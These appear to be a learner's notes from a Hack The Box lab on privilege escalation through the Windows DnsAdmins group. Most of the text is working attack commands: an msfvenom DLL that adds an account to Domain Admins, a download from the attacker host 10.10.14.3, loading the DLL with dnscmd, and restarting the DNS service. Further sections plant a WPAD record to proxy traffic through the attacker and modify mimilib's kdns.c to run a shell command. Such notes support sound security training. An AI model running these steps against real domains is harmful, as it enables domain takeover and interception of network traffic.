
Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports` custom plugins` and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as `NT AUTHORITY\SYSTEM`. We can use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. 

---
## Leveraging DnsAdmins Access

```sh
> msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
### Generating a malicious DLL
```

```Note
We must specify the full path to our custom DLL or the attack will not work.
```

```PowerShell
PS C:\htb> wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
### Downloading the malicious DLL on target

C:\htb> Get-ADGroupMember -Identity DnsAdmins
### Confirming group memberships in the DnsAdmins group

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Tools\adduser.dll
### Loading the custom DLL, serverlevelplugindll is a property here
```

Membership in the `DnsAdmins` group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do. `The DLL will be loaded the next time the DNS service is started.`

```Powershell
C:\htb> wmic useraccount where name="netadm" get sid
### Checking our User's SID

C:\htb> sc.exe sdshow DNS
### Checking permissions on the service 

C:\htb> sc stop dns
### Stopping the dns

C:\htb> sc start dns
### Starting the dns, it most prolly will fail to start but exploit works

C:\htb> net group "Domain Admins" /dom
### Checking if our account is added to the Domain Admins group
```

Group memberships are executed on logging in again so all i did is opened a new instance from `evil-winrm` and was able to read the flag.

[Article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) tells that `RPWP` permissions translate to `SERVICE_START` and `SERVICE_STOP`.
`Checkout SDDL syntax in Windows`.

---
## Cleaning Up

```PowerShell
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
### Confirming the existence of added custom DLL.

C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
### Deleting the registry key pointing to our custom DLL

C:\htb> sc.exe start dns
### Starting DNS back again, recheck w sc query dns or nslookup
```

This is a potentially destructive attack, we should carry with explicit permission.

---
## Creating a WPAD Record

Disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our host.

```Powershell
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
### Disabling the Global Query Block List

C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
### Adding a WPAD point to our machine, we can use responder or inveigh then
```

---
## Using Mimilib.dll

 [Post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain CE by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner.

```c
/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

---